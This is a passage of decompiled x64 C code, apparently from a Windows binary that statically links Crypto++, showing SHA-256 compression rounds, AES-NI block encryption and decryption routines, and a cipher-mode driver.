      v116 = v179.m128i_i32[0] ^ v112;
      v117 = v114 + (v179.m128i_i32[0] ^ v116 & v111);
      v118 = v179.m128i_i32[2] + v114;
      v179.m128i_i32[2] = v118;
      v119 = (__ROR4__(__ROR4__(v115, 2), 11) ^ __ROR4__(v115, 2) ^ __ROR4__(v115, 22)) + v117;
      v178.m128i_i32[2] = v119;
      v120 = v178.m128i_i32[1]
           + v3[6]
           + (__ROR4__(__ROR4__(v118, 6), 5) ^ __ROR4__(v118, 6) ^ __ROR4__(v118, 25))
           + (v178.m128i_i32[0] ^ v118 & (v178.m128i_i32[0] ^ v179.m128i_i32[3]));
      HIDWORD(v184) += v180
                     + (__ROR4__(HIDWORD(v185), 17) ^ (HIDWORD(v185) >> 10) ^ __ROR4__(__ROR4__(HIDWORD(v185), 17), 2))
                     + (__ROR4__(__ROR4__(v184, 7), 11) ^ __ROR4__(v184, 7) ^ ((unsigned int)v184 >> 3));
      v121 = HIDWORD(v184) + v120;
      v122 = v119;
      v123 = v178.m128i_i32[3] ^ v119;
      v179.m128i_i32[1] += v121;
      v124 = (__ROR4__(__ROR4__(v122, 2), 11) ^ __ROR4__(v122, 2) ^ __ROR4__(v122, 22))
           + v121
           + (v178.m128i_i32[3] ^ v123 & v116);
      v178.m128i_i32[1] = v124;
      v125 = v178.m128i_i32[0]
           + v3[7]
           + (__ROR4__(__ROR4__(v179.m128i_i32[1], 6), 5) ^ __ROR4__(v179.m128i_i32[1], 6) ^ __ROR4__(
                                                                                               v179.m128i_i32[1],
                                                                                               25))
           + (v179.m128i_i32[3] ^ v179.m128i_i32[1] & (v179.m128i_i32[3] ^ v118));
      LODWORD(v184) = v184
                    + HIDWORD(v187)
                    + (__ROR4__(v185, 17) ^ ((unsigned int)v185 >> 10) ^ __ROR4__(__ROR4__(v185, 17), 2))
                    + (__ROR4__(__ROR4__(HIDWORD(v183), 7), 11) ^ __ROR4__(HIDWORD(v183), 7) ^ (HIDWORD(v183) >> 3));
      v126 = v184 + v125;
      v127 = v124;
      v128 = v178.m128i_i32[2] ^ v124;
      v129 = v126 + (v178.m128i_i32[2] ^ v128 & v123);
      v130 = v179.m128i_i32[0] + v126;
      v179.m128i_i32[0] = v130;
      v131 = (__ROR4__(__ROR4__(v127, 2), 11) ^ __ROR4__(v127, 2) ^ __ROR4__(v127, 22)) + v129;
      v178.m128i_i32[0] = v131;
      v132 = v179.m128i_i32[3]
           + v3[8]
           + (__ROR4__(__ROR4__(v130, 6), 5) ^ __ROR4__(v130, 6) ^ __ROR4__(v130, 25))
           + (v179.m128i_i32[2] ^ v130 & (v179.m128i_i32[2] ^ v179.m128i_i32[1]));
      HIDWORD(v183) += v187
                     + (__ROR4__(HIDWORD(v184), 17) ^ (HIDWORD(v184) >> 10) ^ __ROR4__(__ROR4__(HIDWORD(v184), 17), 2))
                     + (__ROR4__(__ROR4__(v183, 7), 11) ^ __ROR4__(v183, 7) ^ ((unsigned int)v183 >> 3));
      v133 = HIDWORD(v183) + v132;
      v134 = v131;
      v135 = v178.m128i_i32[1] ^ v131;
      v178.m128i_i32[3] += v133;
      v136 = (__ROR4__(__ROR4__(v134, 2), 11) ^ __ROR4__(v134, 2) ^ __ROR4__(v134, 22))
           + v133
           + (v178.m128i_i32[1] ^ v135 & v128);
      v179.m128i_i32[3] = v136;
      v137 = v179.m128i_i32[2]
           + v3[9]
           + (__ROR4__(__ROR4__(v178.m128i_i32[3], 6), 5) ^ __ROR4__(v178.m128i_i32[3], 6) ^ __ROR4__(
                                                                                               v178.m128i_i32[3],
                                                                                               25))
           + (v179.m128i_i32[1] ^ v178.m128i_i32[3] & (v179.m128i_i32[1] ^ v130));
      LODWORD(v183) = v183
                    + HIDWORD(v186)
                    + (__ROR4__(v184, 17) ^ ((unsigned int)v184 >> 10) ^ __ROR4__(__ROR4__(v184, 17), 2))
                    + (__ROR4__(__ROR4__(HIDWORD(v182), 7), 11) ^ __ROR4__(HIDWORD(v182), 7) ^ (HIDWORD(v182) >> 3));
      v138 = v183 + v137;
      v139 = v136;
      v140 = v178.m128i_i32[0] ^ v136;
      v141 = v138 + (v178.m128i_i32[0] ^ v140 & v135);
      v142 = v178.m128i_i32[2] + v138;
      v178.m128i_i32[2] = v142;
      v143 = (__ROR4__(__ROR4__(v139, 2), 11) ^ __ROR4__(v139, 2) ^ __ROR4__(v139, 22)) + v141;
      v179.m128i_i32[2] = v143;
      v144 = v179.m128i_i32[1]
           + v3[10]
           + (__ROR4__(__ROR4__(v142, 6), 5) ^ __ROR4__(v142, 6) ^ __ROR4__(v142, 25))
           + (v179.m128i_i32[0] ^ v142 & (v179.m128i_i32[0] ^ v178.m128i_i32[3]));
      HIDWORD(v182) += v186
                     + (__ROR4__(HIDWORD(v183), 17) ^ (HIDWORD(v183) >> 10) ^ __ROR4__(__ROR4__(HIDWORD(v183), 17), 2))
                     + (__ROR4__(__ROR4__(v182, 7), 11) ^ __ROR4__(v182, 7) ^ ((unsigned int)v182 >> 3));
      v145 = HIDWORD(v182) + v144;
      v146 = v143;
      v147 = v179.m128i_i32[3] ^ v143;
      v178.m128i_i32[1] += v145;
      v148 = (__ROR4__(__ROR4__(v146, 2), 11) ^ __ROR4__(v146, 2) ^ __ROR4__(v146, 22))
           + v145
           + (v179.m128i_i32[3] ^ v147 & v140);
      v179.m128i_i32[1] = v148;
      v149 = v179.m128i_i32[0]
           + v3[11]
           + (__ROR4__(__ROR4__(v178.m128i_i32[1], 6), 5) ^ __ROR4__(v178.m128i_i32[1], 6) ^ __ROR4__(
                                                                                               v178.m128i_i32[1],
                                                                                               25))
           + (v178.m128i_i32[3] ^ v178.m128i_i32[1] & (v178.m128i_i32[3] ^ v142));
      LODWORD(v182) = v182
                    + HIDWORD(v185)
                    + (__ROR4__(v183, 17) ^ ((unsigned int)v183 >> 10) ^ __ROR4__(__ROR4__(v183, 17), 2))
                    + (__ROR4__(__ROR4__(HIDWORD(v181), 7), 11) ^ __ROR4__(HIDWORD(v181), 7) ^ (HIDWORD(v181) >> 3));
      v150 = v182 + v149;
      v151 = v148;
      v152 = v179.m128i_i32[2] ^ v148;
      v153 = v150 + (v179.m128i_i32[2] ^ v152 & v147);
      v154 = v178.m128i_i32[0] + v150;
      v178.m128i_i32[0] = v154;
      v155 = (__ROR4__(__ROR4__(v151, 2), 11) ^ __ROR4__(v151, 2) ^ __ROR4__(v151, 22)) + v153;
      v179.m128i_i32[0] = v155;
      v156 = v178.m128i_i32[3]
           + v3[12]
           + (__ROR4__(__ROR4__(v154, 6), 5) ^ __ROR4__(v154, 6) ^ __ROR4__(v154, 25))
           + (v178.m128i_i32[2] ^ v154 & (v178.m128i_i32[2] ^ v178.m128i_i32[1]));
      HIDWORD(v181) += v185
                     + (__ROR4__(HIDWORD(v182), 17) ^ (HIDWORD(v182) >> 10) ^ __ROR4__(__ROR4__(HIDWORD(v182), 17), 2))
                     + (__ROR4__(__ROR4__(v181, 7), 11) ^ __ROR4__(v181, 7) ^ ((unsigned int)v181 >> 3));
      v157 = HIDWORD(v181) + v156;
      v158 = v155;
      v159 = v179.m128i_i32[1] ^ v155;
      v179.m128i_i32[3] += v157;
      v160 = (__ROR4__(__ROR4__(v158, 2), 11) ^ __ROR4__(v158, 2) ^ __ROR4__(v158, 22))
           + v157
           + (v179.m128i_i32[1] ^ v159 & v152);
      v178.m128i_i32[3] = v160;
      v161 = v178.m128i_i32[2]
           + v3[13]
           + (__ROR4__(__ROR4__(v179.m128i_i32[3], 6), 5) ^ __ROR4__(v179.m128i_i32[3], 6) ^ __ROR4__(
                                                                                               v179.m128i_i32[3],
                                                                                               25))
           + (v178.m128i_i32[1] ^ v179.m128i_i32[3] & (v178.m128i_i32[1] ^ v154));
      LODWORD(v181) = v181
                    + HIDWORD(v184)
                    + (__ROR4__(v182, 17) ^ ((unsigned int)v182 >> 10) ^ __ROR4__(__ROR4__(v182, 17), 2))
                    + (__ROR4__(__ROR4__(HIDWORD(v180), 7), 11) ^ __ROR4__(HIDWORD(v180), 7) ^ (HIDWORD(v180) >> 3));
      v162 = v181 + v161;
      v163 = v160;
      v164 = v179.m128i_i32[0] ^ v160;
      v165 = v162 + (v179.m128i_i32[0] ^ v164 & v159);
      v166 = v179.m128i_i32[2] + v162;
      v179.m128i_i32[2] = v166;
      v167 = (__ROR4__(__ROR4__(v163, 2), 11) ^ __ROR4__(v163, 2) ^ __ROR4__(v163, 22)) + v165;
      v178.m128i_i32[2] = v167;
      v168 = v178.m128i_i32[1]
           + v3[14]
           + (__ROR4__(__ROR4__(v166, 6), 5) ^ __ROR4__(v166, 6) ^ __ROR4__(v166, 25))
           + (v178.m128i_i32[0] ^ v166 & (v178.m128i_i32[0] ^ v179.m128i_i32[3]));
      HIDWORD(v180) += v184
                     + (__ROR4__(HIDWORD(v181), 17) ^ (HIDWORD(v181) >> 10) ^ __ROR4__(__ROR4__(HIDWORD(v181), 17), 2))
                     + (__ROR4__(__ROR4__(v180, 7), 11) ^ __ROR4__(v180, 7) ^ ((unsigned int)v180 >> 3));
      v169 = HIDWORD(v180) + v168;
      v170 = v167;
      v171 = v178.m128i_i32[3] ^ v167;
      v179.m128i_i32[1] += v169;
      v172 = (__ROR4__(__ROR4__(v170, 2), 11) ^ __ROR4__(v170, 2) ^ __ROR4__(v170, 22))
           + v169
           + (v178.m128i_i32[3] ^ v171 & v164);
      v178.m128i_i32[1] = v172;
      v173 = v178.m128i_i32[0]
           + v3[15]
           + (__ROR4__(__ROR4__(v179.m128i_i32[1], 6), 5) ^ __ROR4__(v179.m128i_i32[1], 6) ^ __ROR4__(
                                                                                               v179.m128i_i32[1],
                                                                                               25))
           + (v179.m128i_i32[3] ^ v179.m128i_i32[1] & (v179.m128i_i32[3] ^ v166));
      LODWORD(v180) = v180
                    + HIDWORD(v183)
                    + (__ROR4__(v181, 17) ^ ((unsigned int)v181 >> 10) ^ __ROR4__(__ROR4__(v181, 17), 2))
                    + (__ROR4__(__ROR4__(HIDWORD(v187), 7), 11) ^ __ROR4__(HIDWORD(v187), 7) ^ (HIDWORD(v187) >> 3));
      v174 = v180 + v173;
      v175 = v172;
      result = v178.m128i_i32[2] ^ (unsigned int)v172;
      v176 = v174 + (v178.m128i_i32[2] ^ result & v171);
      v82 = v179.m128i_i32[0] + v174;
      v179.m128i_i32[0] = v82;
      v83 = (__ROR4__(__ROR4__(v175, 2), 11) ^ __ROR4__(v175, 2) ^ __ROR4__(v175, 22)) + v176;
      v178.m128i_i32[0] = v83;
    }
    while ( v3 != v188 );
    v177 = (__m128i *)v189;
    v5 = _mm_add_epi32(_mm_load_si128(v189 + 1), v179);
    v4 = _mm_add_epi32(_mm_load_si128(v189), v178);
    _mm_store_si128((__m128i *)&v189[1], v5);
    _mm_store_si128(v177, v4);
    a2 = v190 + 8;
    v190 = a2;
  }
  while ( a2 != v191 );
  return result;
}

//----- (0000000140064880) ----------------------------------------------------
unsigned __int64 __fastcall sub_140064880(void (__fastcall *a1)(__m128i *, __int64, _QWORD), void (__fastcall *a2)(__m128i *, __m128i *, __m128i *, __m128i *, __int64, __int64), __int64 a3, unsigned int a4, __m128i *a5, const __m128i *a6, __m128i *a7, unsigned __int64 a8, char a9)
{
  char v9; // r13
  const __m128i *v10; // rsi
  unsigned __int64 v11; // r14
  signed __int64 v12; // r12
  __int64 v13; // r10
  void (__fastcall *v14)(__m128i *, __m128i *, __m128i *, __m128i *, __int64, __int64); // r11
  __int64 v15; // rcx
  signed __int64 v16; // r15
  __m128i *v17; // rbx
  __m128i *v18; // rdi
  int v19; // eax
  __m128i v20; // xmm4
  __m128i v21; // xmm0
  __m128i v22; // xmm1
  __m128i v23; // xmm2
  __m128i v24; // xmm3
  const __m128i *v25; // rbx
  const __m128i *v26; // rbx
  const __m128i *v27; // rbx
  __m128i v28; // xmm0
  const __m128i *v29; // rsi
  __m128i v30; // xmm0
  const __m128i *v31; // rsi
  __m128i v32; // xmm0
  const __m128i *v33; // rsi
  __m128i v34; // xmm0
  __m128i v35; // xmm0
  const __m128i *v36; // rsi
  __m128i v37; // xmm1
  __m128i v38; // xmm0
  const __m128i *v39; // rsi
  __m128i v40; // xmm2
  __m128i v41; // xmm1
  const __m128i *v42; // rsi
  __m128i v43; // xmm3
  __m128i v44; // xmm2
  __m128i v45; // xmm3
  __m128i *v46; // rdi
  __m128i *v47; // rdi
  __m128i *v48; // rdi
  unsigned __int64 result; // rax
  char v50; // cl
  int v51; // er13
  int v52; // ecx
  __m128i v53; // xmm1
  __m128i v54; // xmm0
  __int64 v55; // [rsp+28h] [rbp-59h]
  __int64 v56; // [rsp+30h] [rbp-51h]
  unsigned __int64 v57; // [rsp+38h] [rbp-49h]
  __m128i v58; // [rsp+40h] [rbp-41h]
  __m128i v59; // [rsp+50h] [rbp-31h]
  __m128i v60; // [rsp+60h] [rbp-21h]
  __m128i v61; // [rsp+70h] [rbp-11h]
  void (__fastcall *v62)(__m128i *, __int64, _QWORD); // [rsp+D0h] [rbp+4Fh]
  void (__fastcall *v63)(__m128i *, __m128i *, __m128i *, __m128i *, __int64, __int64); // [rsp+D8h] [rbp+57h]
  __int64 v64; // [rsp+E0h] [rbp+5Fh]
  unsigned int v65; // [rsp+E8h] [rbp+67h]
  unsigned __int64 v66; // [rsp+F8h] [rbp+77h]
  int v67; // [rsp+110h] [rbp+8Fh]

  v65 = a4;
  v64 = a3;
  v63 = a2;
  v62 = a1;
  v9 = a9;
  v10 = a6;
  v11 = a8;
  v12 = 16i64;
  v13 = a3;
  if ( a9 & 3 )
    v12 = 0i64;
  v14 = a2;
  v15 = a6 != 0i64 ? 0x10 : 0;
  v16 = 8i64 * (~a9 & 2);
  v56 = a6 != 0i64 ? 0x10 : 0;
  if ( a9 & 8 )
  {
    v15 = -v15;
    v17 = (__m128i *)((char *)a5 + a8 - 16);
    v12 = -v12;
    v18 = (__m128i *)((char *)a7 + a8 - 16);
    v10 = (const __m128i *)((char *)a6 + a8 - 16);
    v56 = v15;
    v16 = -8i64 * (~a9 & 2);
  }
  else
  {
    v18 = a7;
    v17 = a5;
  }
  if ( a9 & 0x10 && a8 >= 0x40 )
  {
    v19 = a9 & 4;
    v57 = a8 >> 6;
    do
    {
      v20 = _mm_loadu_si128(v17);
      _mm_store_si128(&v61, v20);
      if ( a9 & 1 )
      {
        v21 = _mm_load_si128((const __m128i *)&xmmword_1400AD5E0);
        v22 = _mm_add_epi32(v21, v20);
        v23 = _mm_add_epi32(v21, v22);
        v24 = _mm_add_epi32(v21, v23);
        _mm_storeu_si128(v17, _mm_add_epi32(v21, v24));
      }
      else
      {
        v25 = (__m128i *)((char *)v17 + v12);
        v22 = _mm_loadu_si128(v25);
        v26 = (const __m128i *)((char *)v25 + v12);
        v23 = _mm_loadu_si128(v26);
        v27 = (const __m128i *)((char *)v26 + v12);
        v24 = _mm_loadu_si128(v27);
        v17 = (__m128i *)((char *)v27 + v12);
      }
      _mm_store_si128(&v60, v24);
      _mm_store_si128(&v59, v23);
      _mm_store_si128(&v58, v22);
      if ( v19 )
      {
        v28 = _mm_loadu_si128(v10);
        v29 = (const __m128i *)((char *)v10 + v15);
        _mm_store_si128(&v61, _mm_xor_si128(v28, v20));
        v30 = _mm_loadu_si128(v29);
        v31 = (const __m128i *)((char *)v29 + v15);
        _mm_store_si128(&v58, _mm_xor_si128(v30, v22));
        v32 = _mm_loadu_si128(v31);
        v33 = (const __m128i *)((char *)v31 + v15);
        _mm_store_si128(&v59, _mm_xor_si128(v32, v23));
        v34 = _mm_loadu_si128(v33);
        v10 = (const __m128i *)((char *)v33 + v15);
        _mm_store_si128(&v60, _mm_xor_si128(v34, v24));
      }
      LODWORD(v55) = a4;
      v14(&v61, &v58, &v59, &v60, v13, v55);
      v19 = a9 & 4;
      if ( !v10 || a9 & 4 )
      {
        v38 = _mm_load_si128(&v61);
        v41 = _mm_load_si128(&v58);
        v44 = _mm_load_si128(&v59);
        v15 = v56;
        v45 = _mm_load_si128(&v60);
      }
      else
      {
        v35 = _mm_loadu_si128(v10);
        v15 = v56;
        v36 = (const __m128i *)((char *)v10 + v56);
        v37 = _mm_loadu_si128(v36);
        v38 = _mm_xor_si128(v35, v61);
        v39 = (const __m128i *)((char *)v36 + v56);
        v40 = _mm_loadu_si128(v39);
        v41 = _mm_xor_si128(v37, v58);
        v42 = (const __m128i *)((char *)v39 + v56);
        v43 = _mm_loadu_si128(v42);
        v44 = _mm_xor_si128(v40, v59);
        v10 = (const __m128i *)((char *)v42 + v56);
        v45 = _mm_xor_si128(v43, v60);
      }
      a4 = v65;
      v13 = v64;
      v14 = v63;
      _mm_storeu_si128(v18, v38);
      v46 = (__m128i *)((char *)v18 + v16);
      v11 -= 64i64;
      _mm_storeu_si128(v46, v41);
      v47 = (__m128i *)((char *)v46 + v16);
      _mm_storeu_si128(v47, v44);
      v48 = (__m128i *)((char *)v47 + v16);
      _mm_storeu_si128(v48, v45);
      v18 = (__m128i *)((char *)v48 + v16);
      --v57;
    }
    while ( v57 );
    v9 = a9;
  }
  result = v11;
  if ( v11 >= 0x10 )
  {
    v50 = v9;
    v51 = v9 & 4;
    v52 = v50 & 1;
    v66 = v11 >> 4;
    v67 = v52;
    do
    {
      v53 = _mm_loadu_si128(v17);
      _mm_store_si128(&v61, v53);
      if ( v51 )
        _mm_store_si128(&v61, _mm_xor_si128(_mm_loadu_si128(v10), v53));
      if ( v52 )
        ++HIBYTE(v17->m128i_i64[1]);
      v62(&v61, v13, a4);
      if ( !v10 || v51 )
        v54 = _mm_load_si128(&v61);
      else
        v54 = _mm_xor_si128(_mm_loadu_si128(v10), v61);
      v10 = (const __m128i *)((char *)v10 + v56);
      v52 = v67;
      a4 = v65;
      _mm_storeu_si128(v18, v54);
      v13 = v64;
      v18 = (__m128i *)((char *)v18 + v16);
      v17 = (__m128i *)((char *)v17 + v12);
      v11 -= 16i64;
      --v66;
    }
    while ( v66 );
    result = v11;
  }
  return result;
}
// 1400AD5E0: using guessed type __int128 xmmword_1400AD5E0;

//----- (0000000140064B80) ----------------------------------------------------
signed __int64 __fastcall sub_140064B80(_QWORD *a1, unsigned __int64 *a2)
{
  unsigned __int64 v2; // r8
  unsigned __int64 v3; // rcx
  signed __int64 v4; // rcx
  char v6; // [rsp+28h] [rbp-80h]
  __int64 v7; // [rsp+38h] [rbp-70h]
  __int64 v8; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v9)(void *); // [rsp+50h] [rbp-58h]
  int v10; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v12; // [rsp+80h] [rbp-28h]
  __int64 v13; // [rsp+88h] [rbp-20h]

  v2 = *a2;
  if ( *a1 > 2305843009213693950i64 - *a2 )
  {
    v8 = 15i64;
    v7 = 0i64;
    v6 = 0;
    sub_140004F20(&v6, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v9);
    v9 = &off_1400A8798;
    v10 = 1;
    v13 = 15i64;
    v12 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v6, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v9 = &off_1400A8798;
    CxxThrowException(&v9, &_TI3_AVcls_001_CryptoPP__);
  }
  v3 = *a1 + v2 - 1;
  if ( !v2 || (v2 - 1) & v2 )
    v4 = v3 - v3 % v2;
  else
    v4 = v3 - (v3 & (v2 - 1));
  return v4;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (0000000140064CA0) ----------------------------------------------------
signed __int64 __fastcall sub_140064CA0(__m128i *a1, __m128i *a2, __m128i *a3, __m128i *a4, const __m128i *a5, unsigned int a6)
{
  __m128i *v6; // r10
  __m128i v7; // xmm2
  const __m128i *v8; // rcx
  __int64 v9; // r11
  signed __int64 result; // rax

  v6 = a1;
  v7 = _mm_load_si128(a5);
  _mm_store_si128(a1, _mm_xor_si128(_mm_load_si128(a1), v7));
  _mm_store_si128(a2, _mm_xor_si128(_mm_load_si128(a2), v7));
  _mm_store_si128(a3, _mm_xor_si128(_mm_load_si128(a3), v7));
  _mm_store_si128(a4, _mm_xor_si128(_mm_load_si128(a4), v7));
  if ( a6 > 1 )
  {
    v8 = a5 + 1;
    v9 = a6 - 1;
    do
    {
      _XMM2 = _mm_load_si128(v8);
      _XMM0 = _mm_load_si128(v6);
      ++v8;
      __asm { aesdec  xmm0, xmm2 }
      _mm_store_si128(v6, _XMM0);
      _XMM1 = _mm_load_si128(a2);
      __asm { aesdec  xmm1, xmm2 }
      _mm_store_si128(a2, _XMM1);
      _XMM0 = _mm_load_si128(a3);
      __asm { aesdec  xmm0, xmm2 }
      _mm_store_si128(a3, _XMM0);
      _XMM1 = _mm_load_si128(a4);
      __asm { aesdec  xmm1, xmm2 }
      _mm_store_si128(a4, _XMM1);
      --v9;
    }
    while ( v9 );
  }
  _XMM0 = _mm_load_si128(v6);
  result = 2i64 * a6;
  _XMM2 = _mm_load_si128(&a5[a6]);
  __asm { aesdeclast xmm0, xmm2 }
  _mm_store_si128(v6, _XMM0);
  _XMM1 = _mm_load_si128(a2);
  __asm { aesdeclast xmm1, xmm2 }
  _mm_store_si128(a2, _XMM1);
  _XMM0 = _mm_load_si128(a3);
  __asm { aesdeclast xmm0, xmm2 }
  _mm_store_si128(a3, _XMM0);
  _XMM1 = _mm_load_si128(a4);
  __asm { aesdeclast xmm1, xmm2 }
  _mm_store_si128(a4, _XMM1);
  return result;
}

//----- (0000000140064DA0) ----------------------------------------------------
signed __int64 __fastcall sub_140064DA0(__m128i *a1, __m128i *a2, unsigned int a3)
{
  __int64 v5; // rdx
  signed __int64 result; // rax

  _R10 = a2;
  _mm_store_si128(a1, _mm_xor_si128(_mm_load_si128(a1), *a2));
  if ( a3 - 1 > 1 )
  {
    _R9 = (signed __int64)a2[1].m128i_i64;
    v5 = ((a3 - 3) >> 1) + 1;
    do
    {
      _XMM0 = _mm_load_si128(a1);
      _R9 += 32i64;
      __asm { aesdec  xmm0, xmmword ptr [r9-20h] }
      _mm_store_si128(a1, _XMM0);
      __asm { aesdec  xmm0, xmmword ptr [r9-10h] }
      _mm_store_si128(a1, _XMM0);
      --v5;
    }
    while ( v5 );
  }
  _XMM0 = _mm_load_si128(a1);
  _RAX = 2i64 * (a3 - 1);
  __asm { aesdec  xmm0, xmmword ptr [r10+rax*8] }
  result = 2i64 * a3;
  _mm_store_si128(a1, _XMM0);
  __asm { aesdeclast xmm0, xmmword ptr [r10+rax*8] }
  _mm_store_si128(a1, _XMM0);
  return result;
}

//----- (0000000140064E20) ----------------------------------------------------
signed __int64 __fastcall sub_140064E20(__m128i *a1, __m128i *a2, __m128i *a3, __m128i *a4, const __m128i *a5, unsigned int a6)
{
  __m128i *v6; // r10
  __m128i v7; // xmm2
  const __m128i *v8; // rcx
  __int64 v9; // r11
  signed __int64 result; // rax

  v6 = a1;
  v7 = _mm_load_si128(a5);
  _mm_store_si128(a1, _mm_xor_si128(_mm_load_si128(a1), v7));
  _mm_store_si128(a2, _mm_xor_si128(_mm_load_si128(a2), v7));
  _mm_store_si128(a3, _mm_xor_si128(_mm_load_si128(a3), v7));
  _mm_store_si128(a4, _mm_xor_si128(_mm_load_si128(a4), v7));
  if ( a6 > 1 )
  {
    v8 = a5 + 1;
    v9 = a6 - 1;
    do
    {
      _XMM2 = _mm_load_si128(v8);
      _XMM0 = _mm_load_si128(v6);
      ++v8;
      __asm { aesenc  xmm0, xmm2 }
      _mm_store_si128(v6, _XMM0);
      _XMM1 = _mm_load_si128(a2);
      __asm { aesenc  xmm1, xmm2 }
      _mm_store_si128(a2, _XMM1);
      _XMM0 = _mm_load_si128(a3);
      __asm { aesenc  xmm0, xmm2 }
      _mm_store_si128(a3, _XMM0);
      _XMM1 = _mm_load_si128(a4);
      __asm { aesenc  xmm1, xmm2 }
      _mm_store_si128(a4, _XMM1);
      --v9;
    }
    while ( v9 );
  }
  _XMM0 = _mm_load_si128(v6);
  result = 2i64 * a6;
  _XMM2 = _mm_load_si128(&a5[a6]);
  __asm { aesenclast xmm0, xmm2 }
  _mm_store_si128(v6, _XMM0);
  _XMM1 = _mm_load_si128(a2);
  __asm { aesenclast xmm1, xmm2 }
  _mm_store_si128(a2, _XMM1);
  _XMM0 = _mm_load_si128(a3);
  __asm { aesenclast xmm0, xmm2 }
  _mm_store_si128(a3, _XMM0);
  _XMM1 = _mm_load_si128(a4);
  __asm { aesenclast xmm1, xmm2 }
  _mm_store_si128(a4, _XMM1);
  return result;
}

//----- (0000000140064F20) ----------------------------------------------------
signed __int64 __fastcall sub_140064F20(__m128i *a1, __m128i *a2, unsigned int a3)
{
  __int64 v5; // rdx
  signed __int64 result; // rax

  _R10 = a2;
  _mm_store_si128(a1, _mm_xor_si128(_mm_load_si128(a1), *a2));
  if ( a3 - 1 > 1 )
  {
    _R9 = (signed __int64)a2[1].m128i_i64;
    v5 = ((a3 - 3) >> 1) + 1;
    do
    {
      _XMM0 = _mm_load_si128(a1);
      _R9 += 32i64;
      __asm { aesenc  xmm0, xmmword ptr [r9-20h] }
      _mm_store_si128(a1, _XMM0);
      __asm { aesenc  xmm0, xmmword ptr [r9-10h] }
      _mm_store_si128(a1, _XMM0);
      --v5;
    }
    while ( v5 );
  }
  _XMM0 = _mm_load_si128(a1);
  _RAX = 2i64 * (a3 - 1);
  __asm { aesenc  xmm0, xmmword ptr [r10+rax*8] }
  result = 2i64 * a3;
  _mm_store_si128(a1, _XMM0);
  __asm { aesenclast xmm0, xmmword ptr [r10+rax*8] }
  _mm_store_si128(a1, _XMM0);
  return result;
}

//----- (0000000140064FA0) ----------------------------------------------------
unsigned __int64 __fastcall sub_140064FA0(__int64 a1, __m128i *a2, const __m128i *a3, __m128i *a4, unsigned __int64 a5, char a6)
{
  __m128i *v6; // rdi
  const __m128i *v7; // rsi
  __m128i *v8; // rbp
  __int64 v9; // rbx
  unsigned __int64 result; // rax

  v6 = a4;
  v7 = a3;
  v8 = a2;
  v9 = a1;
  if ( !byte_1400DBD4C )
    sub_14006AA50();
  if ( byte_1400DBD51 )
    result = sub_140064880(
               (void (__fastcall *)(__m128i *, __int64, _QWORD))sub_140064DA0,
               (void (__fastcall *)(__m128i *, __m128i *, __m128i *, __m128i *, __int64, __int64))sub_140064CA0,
               *(_QWORD *)(v9 + 288),
               *(_DWORD *)(v9 + 16),
               v8,
               v7,
               v6,
               a5,
               a6);
  else
    result = sub_140037390(v9, (unsigned __int64)v8, (unsigned __int64)v7, (unsigned __int64)v6, a5, a6);
  return result;
}
// 1400DBD4C: using guessed type char byte_1400DBD4C;
// 1400DBD51: using guessed type char byte_1400DBD51;

//----- (0000000140065060) ----------------------------------------------------
unsigned __int64 __fastcall sub_140065060(__int64 a1, __m128i *a2, const __m128i *a3, __m128i *a4, unsigned __int64 a5, char a6)
{
  __m128i *v6; // rsi
  const __m128i *v7; // rbx
  __m128i *v8; // rdi
  __int64 v9; // r14
  signed __int64 v11; // r11
  unsigned __int64 v12; // r8
  unsigned __int64 v13; // rcx
  void *v14; // rsp
  char *v15; // r9
  unsigned __int64 v16; // rax
  unsigned __int64 v17; // rdx
  __int64 *v18; // rdx
  __int64 *v19; // r8
  signed __int64 v20; // r8
  signed __int64 v21; // rdx
  unsigned __int64 v22; // r10
  char v23[496]; // [rsp+0h] [rbp-240h]

  v6 = a4;
  v7 = a3;
  v8 = a2;
  v9 = a1;
  if ( !byte_1400DBD4C )
    sub_14006AA50();
  if ( byte_1400DBD51 )
    return sub_140064880(
             (void (__fastcall *)(__m128i *, __int64, _QWORD))sub_140064F20,
             (void (__fastcall *)(__m128i *, __m128i *, __m128i *, __m128i *, __int64, __int64))sub_140064E20,
             *(_QWORD *)(v9 + 288),
             *(_DWORD *)(v9 + 16),
             v8,
             v7,
             v6,
             a5,
             a6);
  if ( a5 < 0x10 )
    return a5;
  v11 = 16i64;
  v12 = (unsigned __int64)&unk_1400DAC70 & 0xFFF;
  v13 = ((unsigned __int16)&unk_1400DAC70 - 2032) & 0xFFF;
  do
  {
    while ( 1 )
    {
      v14 = alloca(576i64);
      v15 = &v23[(unsigned __int8)-(signed __int64)v23];
      v16 = (unsigned __int16)v15 & 0xFFF;
      v17 = ((_WORD)v15 + 312) & 0xFFF;
      if ( v13 > v12 )
        break;
      if ( v16 >= v13 && v17 > v13 && v16 < v12 && v17 <= v12 )
        goto LABEL_18;
    }
  }
  while ( v16 >= v12 && v16 < v13 || v17 > v12 && v17 <= v13 );
LABEL_18:
  if ( a6 & 8 )
  {
    v8 = (__m128i *)((char *)v8 + a5 - 16);
    v7 = (const __m128i *)((char *)v7 + a5 - 16);
    v6 = (__m128i *)((char *)v6 + a5 - 16);
    v11 = -16i64;
  }
  *((_QWORD *)v15 + 28) = v8;
  v18 = &qword_1400DB470;
  if ( !(a6 & 4) || (v19 = (__int64 *)v7) == 0i64 )
    v19 = &qword_1400DB470;
  *((_QWORD *)v15 + 29) = v19;
  if ( !(a6 & 4) && v7 )
    v18 = (__int64 *)v7;
  v20 = v11;
  if ( a6 & 2 )
    v20 = 0i64;
  *((_QWORD *)v15 + 30) = v18;
  *((_QWORD *)v15 + 31) = v6;
  *((_QWORD *)v15 + 32) = v20;
  if ( !(a6 & 4) || (v21 = v11, !v7) )
    v21 = 0i64;
  *((_QWORD *)v15 + 33) = v21;
  if ( a6 & 4 || !v7 )
    v11 = 0i64;
  *((_QWORD *)v15 + 34) = v11;
  *((_QWORD *)v15 + 35) = v20;
  v22 = a5 - (a6 & 1) - (a5 & 0xF);
